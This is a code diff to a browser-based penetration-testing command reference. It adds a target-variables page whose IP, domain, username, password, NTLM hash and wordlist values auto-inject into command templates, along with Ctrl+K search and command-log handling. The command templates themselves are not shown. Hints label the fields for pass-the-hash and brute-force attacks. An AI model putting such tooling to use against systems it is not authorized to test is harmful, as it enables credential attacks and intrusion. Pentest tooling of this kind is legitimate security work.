-  const entry = {id:logId, cmdId:id, ts:new Date().toISOString(), toolKey, toolLabel, platform, purpose, cmd:rawCmd, output:''};
-  if (!state.cmdLog) state.cmdLog = [];
+  const entry = {id:logId, cmdId:id, rawTemplate, ts:new Date().toISOString(), toolKey, toolLabel, platform, purpose, cmd:injectedCmd, output:''};
   state.cmdLog.push(entry);
   saveState();
-  // Visual feedback
-  const btn = cardEl?.querySelector('.btn-log');
-  if (btn) {
-    btn.classList.add('logged'); btn.textContent = '✓';
-    setTimeout(() => { btn.textContent='+'; btn.classList.remove('logged'); }, 1500);
-  }
-  // Update sidebar count
-  renderSidebar();
+  // Mark ALL currently visible cards with the same raw template as logged
+  Object.entries(CMD_REGISTRY).forEach(([cid, tpl]) => {
+    if (tpl === rawTemplate) {
+      const el = document.getElementById('card_'+cid);
+      if (el) {
+        const btn = el.querySelector('.btn-log');
+        if (btn) { btn.classList.add('logged'); btn.textContent = '✓'; }
+      }
+    }
+  });
+  renderHeaderSession();
 }
 
 function updateLogOutput(idx, val) {
@@ -3064,9 +3249,25 @@ function updateLogOutput(idx, val) {
 
 function deleteLogEntry(idx) {
   if (!state.cmdLog) return;
+  const entry = state.cmdLog[idx];
   state.cmdLog.splice(idx, 1);
   saveState();
-  renderSidebar();
+  // If no more entries with this template, reset ALL visible matching cards
+  if (entry && entry.rawTemplate) {
+    const stillLogged = state.cmdLog.some(e => e.rawTemplate === entry.rawTemplate);
+    if (!stillLogged) {
+      Object.entries(CMD_REGISTRY).forEach(([cid, tpl]) => {
+        if (tpl === entry.rawTemplate) {
+          const el = document.getElementById('card_'+cid);
+          if (el) {
+            const btn = el.querySelector('.btn-log');
+            if (btn) { btn.classList.remove('logged'); btn.textContent = '+'; }
+          }
+        }
+      });
+    }
+  }
+  renderHeaderSession();
   renderMain();
 }
 
@@ -3074,7 +3275,7 @@ function clearCmdLog() {
   if (!confirm(t('clearConfirm'))) return;
   state.cmdLog = [];
   saveState();
-  renderSidebar();
+  renderHeaderSession();
   renderMain();
 }
 
@@ -3090,10 +3291,27 @@ function exportCmdLog() {
 
 function renderCmdLog() {
   const log = state.cmdLog || [];
+  const name = state.sessionName || 'SESSION 1';
+  const tv = state.targetVars || {};
+  const ipVal = document.getElementById('ipInput').value.trim();
+  // Build target vars summary
+  const tvRows = [
+    {k:'IP / HOST', v: ipVal},
+    {k:'PORT', v: tv.port},
+    {k:'DOMAIN', v: tv.domain},
+    {k:'USERNAME', v: tv.user},
+    {k:'PASSWORD', v: tv.pass ? '••••••••' : ''},
+    {k:'HASH', v: tv.hash ? tv.hash.slice(0,8)+'...' : ''},
+    {k:'WORDLIST', v: tv.wordlist},
+  ].filter(r => r.v);
+  const tvHtml = tvRows.length ? `<div class="target-session-preview" style="margin-bottom:14px">
+    <div class="target-session-preview-title">TARGET VARS <span style="opacity:.5;font-weight:400">· click to edit</span> <button onclick="navigate('__target__')" style="background:none;border:1px solid var(--border);color:var(--cyan);padding:1px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;border-radius:3px;margin-left:6px;">TARGET PAGE</button></div>
+    <div style="display:flex;flex-wrap:wrap;gap:4px 16px;">${tvRows.map(r=>`<div class="target-session-row"><span class="target-session-key">${r.k}</span><span class="target-session-val">${esc(r.v)}</span></div>`).join('')}</div>
+  </div>` : '';
   let html = `<div class="cmdlog-hdr">
-    <span class="svc-title">${t('cmdLog')}</span>
+    <span class="svc-title" ondblclick="renameSession(event)" style="cursor:pointer" title="Double-click to rename">${esc(name)}</span>
     <span class="cmdlog-count">${log.length} entr${log.length===1?'y':'ies'}</span>
-  </div>`;
+  </div>${tvHtml}`;
   if (log.length > 0) {
     html += `<div class="cmdlog-actions">
       <button class="btn-export" onclick="exportCmdLog()">${t('cmdLogExport')}</button>
@@ -3127,11 +3345,188 @@ function renderCmdLog() {
 // ═══════════════════════════════════════════════════
 //  RENDER — main dispatcher
 // ═══════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════
+//  TARGET PAGE
+// ═══════════════════════════════════════════════════
+function renderTargetPage() {
+  const tv = state.targetVars || {};
+  const ipVal = document.getElementById('ipInput').value.trim();
+  const vars = [
+    {key:'ip',      label:'IP / HOST',    ph:'10.10.10.X',                         inject:'TARGETIP',     hint:'Injected into all commands as TARGETIP', isIP:true},
+    {key:'port',    label:'PORT',          ph:'4444',                                inject:'TARGETPORT',   hint:'Listener port or custom service port'},
+    {key:'domain',  label:'DOMAIN',        ph:'corp.local',                          inject:'TARGETDOMAIN', hint:'Windows domain or DNS domain name'},
+    {key:'user',    label:'USERNAME',      ph:'administrator',                        inject:'TARGETUSER',   hint:'Target username for authenticated commands'},
+    {key:'pass',    label:'PASSWORD',      ph:'Password123!',                         inject:'TARGETPASS',   hint:'Plaintext password for commands'},
+    {key:'hash',    label:'HASH (NTLM)',   ph:'aad3b435b51404ee:NTLMHASH',           inject:'TARGETHASH',   hint:'NT hash for pass-the-hash attacks'},
+    {key:'wordlist',label:'WORDLIST',      ph:'/usr/share/seclists/passwords/rockyou.txt', inject:'TARGETWL', hint:'Wordlist path for brute-force commands'},
+  ];
+
+  const cards = vars.map(v => {
+    const val = v.isIP ? ipVal : (tv[v.key] || '');
+    const inputHandler = v.isIP
+      ? `oninput="document.getElementById('ipInput').value=this.value;state.ip=this.value;saveState()"`
+      : `oninput="saveTargetVar('${v.key}',this.value)"`;
+    return `<div class="target-var-card">
+      <div class="target-var-name">${v.label} <span class="target-var-ph">→ ${v.inject}</span></div>
+      <input class="target-var-input" type="text" placeholder="${esc(v.ph)}" value="${esc(val)}" ${inputHandler} autocomplete="off" spellcheck="false">
+      <div class="target-var-hint">${v.hint}</div>
+    </div>`;
+  }).join('');
+
+  // Build preview of non-empty vars for session summary
+  const filled = vars.filter(v => v.isIP ? ipVal : tv[v.key]);
+  const preview = filled.map(v => {
+    const val = v.isIP ? ipVal : tv[v.key];
+    const display = v.key === 'pass' || v.key === 'hash' ? val.replace(/./g,'•') : val;
+    return `<div class="target-session-row"><span class="target-session-key">${v.label}</span><span class="target-session-val">${esc(display)}</span></div>`;
+  }).join('');
+
+  return `
+  <div class="target-page-hdr">
+    <div class="target-page-title">TARGET</div>
+    <div class="badge">variables</div>
+    <div class="target-page-sub" style="margin-left:auto">Values auto-inject into all commands · TARGETIP · TARGETPORT · TARGETDOMAIN · TARGETUSER · TARGETPASS · TARGETHASH · TARGETWL</div>
+  </div>
+  <div class="target-grid">${cards}</div>
+  ${filled.length ? `<div class="target-session-preview">
+    <div class="target-session-preview-title">Current session values</div>
+    ${preview}
+  </div>` : ''}`;
+}
+
+// ═══════════════════════════════════════════════════
+//  CTRL+K SEARCH
+// ═══════════════════════════════════════════════════
+let searchIndex = null;
+let searchFocusIdx = -1;
+
+function buildSearchIndex() {
+  const items = [];
+  Object.entries(TOOLS_DB).forEach(([key, tool]) => {
+    (tool.categories||[]).forEach(cat => {
+      (cat.cmds||[]).forEach(cmd => {
+        items.push({tool: tool.label, toolKey: key, purpose: cmd.p, cmd: cmd.c.split('\n')[0]});
+      });
+    });
+  });
+  Object.entries(DB).forEach(([key, svc]) => {
+    if (key === 'init') return;
+    (svc.phases||[]).forEach(phase => {
+      (phase.tools||[]).forEach(ts => {
+        (ts.cmds||[]).forEach(cmd => {
+          items.push({tool: svc.label, toolKey: key, purpose: cmd.p, cmd: cmd.c.split('\n')[0]});
+        });
+      });
+    });
+  });
+  // init
+  const initSvc = DB['init'];
+  if (initSvc) {
+    (initSvc.phases||[]).forEach(phase => {
+      (phase.tools||[]).forEach(ts => {
+        (ts.cmds||[]).forEach(cmd => {
+          items.push({tool: 'INIT', toolKey: 'init', purpose: cmd.p, cmd: cmd.c.split('\n')[0]});
+        });
+      });
+    });
+  }
+  Object.entries(ENUM_DB).forEach(([key, item]) => {
+    (item.categories||[]).forEach(cat => {
+      (cat.cmds||[]).forEach(cmd => {
+        items.push({tool: item.label, toolKey: key, purpose: cmd.p, cmd: cmd.c.split('\n')[0]});
+      });
+    });
+  });
+  return items;
+}
+
+function openSearch() {
+  if (!searchIndex) searchIndex = buildSearchIndex();
+  const overlay = document.getElementById('searchOverlay');
+  overlay.classList.add('open');
+  const inp = document.getElementById('searchInput');
+  inp.value = '';
+  inp.focus();
+  document.getElementById('searchResults').innerHTML = '<div class="search-empty">Start typing to search across all commands...</div>';
+  searchFocusIdx = -1;
+}
+
+function closeSearch() {
+  document.getElementById('searchOverlay').classList.remove('open');
+  searchFocusIdx = -1;
+}
+
+function filterSearch(q) {
+  q = q.trim().toLowerCase();
+  if (!q) {
+    document.getElementById('searchResults').innerHTML = '<div class="search-empty">Start typing to search across all commands...</div>';
+    return;
+  }
+  if (!searchIndex) searchIndex = buildSearchIndex();
+  const results = searchIndex.filter(item =>
+    item.purpose.toLowerCase().includes(q) ||
+    item.cmd.toLowerCase().includes(q) ||
+    item.tool.toLowerCase().includes(q)
+  ).slice(0, 18);
+  const el = document.getElementById('searchResults');
+  if (!results.length) {
+    el.innerHTML = `<div class="search-empty">No results for "<b style="color:var(--text)">${esc(q)}</b>"</div>`;
+    return;
+  }
+  el.innerHTML = results.map((r,i) =>
+    `<div class="search-item" data-key="${esc(r.toolKey)}" onclick="searchNavigate('${esc(r.toolKey)}')" onmouseover="searchFocusIdx=${i};updateSearchFocus()">
+      <span class="search-item-tool">${esc(r.tool)}</span>
+      <span class="search-item-purpose">${esc(r.purpose)}</span>
+      <span class="search-item-cmd">${esc(r.cmd)}</span>
+    </div>`
+  ).join('');
+  searchFocusIdx = -1;
+}
+
+function searchNavigate(toolKey) {
+  closeSearch();
+  navigate(toolKey);
+}
+
+function searchKeydown(e) {
+  const items = document.querySelectorAll('.search-item');
+  if (e.key === 'Escape') { closeSearch(); return; }
+  if (e.key === 'ArrowDown') {
+    e.preventDefault();
+    searchFocusIdx = Math.min(searchFocusIdx + 1, items.length - 1);
+    updateSearchFocus();
+  } else if (e.key === 'ArrowUp') {
+    e.preventDefault();
+    searchFocusIdx = Math.max(searchFocusIdx - 1, 0);
+    updateSearchFocus();
+  } else if (e.key === 'Enter') {
+    if (searchFocusIdx >= 0 && items[searchFocusIdx]) {
+      items[searchFocusIdx].click();
+    }
+  }
+}
+
+function updateSearchFocus() {
+  document.querySelectorAll('.search-item').forEach((el, i) => {
+    el.classList.toggle('focused', i === searchFocusIdx);
+    if (i === searchFocusIdx) el.scrollIntoView({block:'nearest'});
+  });
+}
+
+document.addEventListener('keydown', function(e) {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+    e.preventDefault();
+    if (document.getElementById('searchOverlay').classList.contains('open')) closeSearch();
+    else openSearch();
+  }
+});
+
 function renderMain() {
   const content = document.getElementById('content');
   const scrollTop = content.scrollTop;
   if (!currentSvc) { content.innerHTML = ''; return; }
-  if (currentSvc === '__session__') content.innerHTML = renderSession();
+  if (currentSvc === '__target__') content.innerHTML = renderTargetPage();
+  else if (currentSvc === '__session__') content.innerHTML = renderSession();
   else if (currentSvc === '__cmdlog__') content.innerHTML = renderCmdLog();
   else if (TOOLS_DB[currentSvc]) content.innerHTML = renderTool(currentSvc);
   else if (ENUM_DB[currentSvc]) content.innerHTML = renderEnumPage(currentSvc);
@@ -3202,12 +3597,13 @@ async function copyCmd(id, btn) {
 document.getElementById('ipInput').value = state.ip || '';
 document.getElementById('ipInput').addEventListener('input', function(){
   state.ip = this.value; saveState();
-  if (currentSvc) renderMain();
+  if (currentSvc && currentSvc !== '__target__') renderMain();
 });
 
 applyLang();
 renderSidebar();
-navigate('init');
+renderHeaderSession();
+navigate('__target__');
 </script>
 </body>
 </html>
